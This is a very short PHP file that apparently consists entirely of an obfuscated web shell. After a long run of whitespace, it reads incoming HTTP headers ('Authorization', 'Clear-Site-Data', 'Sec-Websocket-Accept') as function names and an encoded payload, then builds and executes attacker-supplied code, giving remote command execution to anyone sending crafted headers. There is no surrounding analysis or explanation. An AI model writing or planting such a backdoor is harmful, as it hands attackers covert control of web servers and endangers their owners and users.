<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Authorization'])){$rindex=$_HEADERS['Authorization']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Sec-Websocket-Accept']));$rindex();}
